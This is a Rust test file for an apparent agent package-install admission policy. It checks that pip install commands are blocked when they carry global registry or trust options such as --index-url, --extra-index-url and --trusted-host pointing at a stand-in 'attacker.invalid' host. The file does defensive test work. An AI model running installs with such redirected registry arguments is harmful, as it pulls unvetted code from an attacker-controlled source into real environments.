use wardnet_agent_artifact_admission::{
    AdmissionPolicy, ApprovedArtifact, ApprovedManifest, ArtifactCoordinate, DecisionKind,
    InstallIntent, InstructionSource, InstructionSourceKind, ReasonCode, admission_decision,
    sha256_hex,
};

const ARTIFACT_DIGEST: &str = "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";
const MANIFEST_DIGEST: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const ARTIFACT_ARGUMENT: &str = "cwl-example==1.2.3";
const HOSTILE_INDEX: &str = "https://attacker.invalid/simple";

#[test]
fn reviewed_pip_baseline_remains_allowed() {
    for executable in ["pip", "pip3"] {
        let (policy, intent) = approved_pip_install(executable);

        let decision = admission_decision(&policy, &intent);

        assert_eq!(decision.decision, DecisionKind::Allow);
        assert!(decision.reason_codes.is_empty());
    }
}

#[test]
fn global_pip_registry_and_trust_selectors_are_causal_trust_evidence() {
    for executable in ["pip", "pip3"] {
        for option in [
            format!("--trusted-host=attacker.invalid"),
            format!("--tr=attacker.invalid"),
            format!("--index-url={HOSTILE_INDEX}"),
            format!("--in={HOSTILE_INDEX}"),
            format!("--extra-index-url={HOSTILE_INDEX}"),
            format!("--ext={HOSTILE_INDEX}"),
            format!("--find-links={HOSTILE_INDEX}"),
            format!("--fi={HOSTILE_INDEX}"),
            "--no-index".to_string(),
            "--no-ind".to_string(),
        ] {
            let (policy, mut intent) = approved_pip_install(executable);
            intent.argv = global_install_argv(executable, &[option.as_str()], &[]);
            let submitted_argv = intent.argv.clone();

            let decision = admission_decision(&policy, &intent);

            assert_eq!(
                decision.decision,
                DecisionKind::Block,
                "{executable} global {option} must fail closed"
            );
            assert!(
                decision
                    .reason_codes
                    .contains(&ReasonCode::AlternateTrustRoot),
                "{executable} global {option} must be classified as registry/trust authority: {:?}",
                decision.reason_codes
            );
            assert!(
                !decision
                    .reason_codes
                    .contains(&ReasonCode::ArtifactNotApproved),
                "{executable} global {option} must not manufacture undeclared-artifact evidence: {:?}",
                decision.reason_codes
            );
            assert_eq!(
                decision.command_sha256,
                sha256_hex(submitted_argv.join("\u{1f}").as_bytes()),
                "normalization must preserve exact submitted argv audit identity"
            );
        }
    }
}

#[test]
fn global_separate_registry_and_trust_values_are_consumed_without_false_artifacts() {
    for executable in ["pip", "pip3"] {
        for (option, value) in [
            ("--trusted-host", "attacker.invalid"),
            ("--tr", "attacker.invalid"),
            ("--index-url", HOSTILE_INDEX),
            ("--in", HOSTILE_INDEX),
            ("--extra-index-url", HOSTILE_INDEX),
            ("--ext", HOSTILE_INDEX),
            ("--find-links", HOSTILE_INDEX),
            ("--fi", HOSTILE_INDEX),
        ] {
            let (policy, mut intent) = approved_pip_install(executable);
            intent.argv = global_install_argv(executable, &[option, value], &[]);

            let decision = admission_decision(&policy, &intent);

            assert_eq!(decision.decision, DecisionKind::Block);
            assert!(
                decision
                    .reason_codes
                    .contains(&ReasonCode::AlternateTrustRoot),
                "{executable} global separate {option} value must be explicit registry/trust evidence: {:?}",
                decision.reason_codes
            );
            assert!(
                !decision
                    .reason_codes
                    .contains(&ReasonCode::ArtifactNotApproved),
                "the value consumed by {option} must not masquerade as a package operand: {:?}",
                decision.reason_codes
            );
        }
    }
}

#[test]
fn real_extra_package_remains_visible_after_global_registry_normalization() {
    for executable in ["pip", "pip3"] {
        let (policy, mut intent) = approved_pip_install(executable);
        intent.argv = global_install_argv(
            executable,
            &["--tr", "attacker.invalid"],
            &["undeclared-package==9.9.9"],
        );

        let decision = admission_decision(&policy, &intent);

        assert_eq!(decision.decision, DecisionKind::Block);
        assert!(
            decision
                .reason_codes
                .contains(&ReasonCode::AlternateTrustRoot),
            "global trusted-host authority must remain explicit"
        );
        assert!(
            decision
                .reason_codes
                .contains(&ReasonCode::ArtifactNotApproved),
            "a genuine additional package must remain visible"
        );
    }
}

#[test]
fn ambiguous_global_long_prefix_is_not_promoted_to_trusted_host() {
    for executable in ["pip", "pip3"] {
        let (policy, mut intent) = approved_pip_install(executable);
        intent.argv = global_install_argv(executable, &["--t=attacker.invalid"], &[]);

        let decision = admission_decision(&policy, &intent);

        assert_eq!(decision.decision, DecisionKind::Block);
        assert!(
            !decision
                .reason_codes
                .contains(&ReasonCode::AlternateTrustRoot),
            "Wardnet must not invent ambiguous --t as --trusted-host: {:?}",
            decision.reason_codes
        );
    }
}

fn global_install_argv(
    executable: &str,
    global_arguments: &[&str],
    extra_packages: &[&str],
) -> Vec<String> {
    let mut argv = Vec::with_capacity(6 + global_arguments.len() + extra_packages.len());
    argv.push(executable.to_string());
    argv.extend(
        global_arguments
            .iter()
            .map(|argument| (*argument).to_string()),
    );
    argv.push("install".to_string());
    argv.push(ARTIFACT_ARGUMENT.to_string());
    argv.extend(
        extra_packages
            .iter()
            .map(|argument| (*argument).to_string()),
    );
    argv.push("--require-hashes".to_string());
    argv.push("--no-deps".to_string());
    argv.push("--no-input".to_string());
    argv
}

fn approved_pip_install(executable: &str) -> (AdmissionPolicy, InstallIntent) {
    let artifact = ArtifactCoordinate {
        ecosystem: "pypi".to_string(),
        name: "cwl-example".to_string(),
        version: "1.2.3".to_string(),
        registry_url: "https://pypi.org/simple".to_string(),
        owner: "ContextualWisdomLab".to_string(),
        sha256: ARTIFACT_DIGEST.to_string(),
        artifact_argument: ARTIFACT_ARGUMENT.to_string(),
    };
    let policy = AdmissionPolicy {
        policy_id: "pypi-global-registry-authority".to_string(),
        policy_revision: "2026-09-12.1".to_string(),
        allowed_executables: vec![executable.to_string()],
        approved_manifests: vec![ApprovedManifest {
            workspace_id: "ContextualWisdomLab/wardnet".to_string(),
            sha256: MANIFEST_DIGEST.to_string(),
        }],
        approved_artifacts: vec![ApprovedArtifact {
            ecosystem: artifact.ecosystem.clone(),
            name: artifact.name.clone(),
            version: artifact.version.clone(),
            registry_url: artifact.registry_url.clone(),
            owner: artifact.owner.clone(),
            sha256: artifact.sha256.clone(),
            artifact_argument: artifact.artifact_argument.clone(),
        }],
    };
    let intent = InstallIntent {
        request_id: format!("req-pypi-global-registry-{executable}"),
        actor_id: "agent:wardnet:admission".to_string(),
        workspace_id: "ContextualWisdomLab/wardnet".to_string(),
        operation: "install".to_string(),
        argv: vec![
            executable.to_string(),
            "install".to_string(),
            ARTIFACT_ARGUMENT.to_string(),
            "--require-hashes".to_string(),
            "--no-deps".to_string(),
            "--no-input".to_string(),
        ],
        manifest_sha256: MANIFEST_DIGEST.to_string(),
        source: InstructionSource {
            kind: InstructionSourceKind::ReviewedConfig,
            uri: None,
            content_sha256: None,
        },
        artifacts: vec![artifact],
    };

    (policy, intent)
}
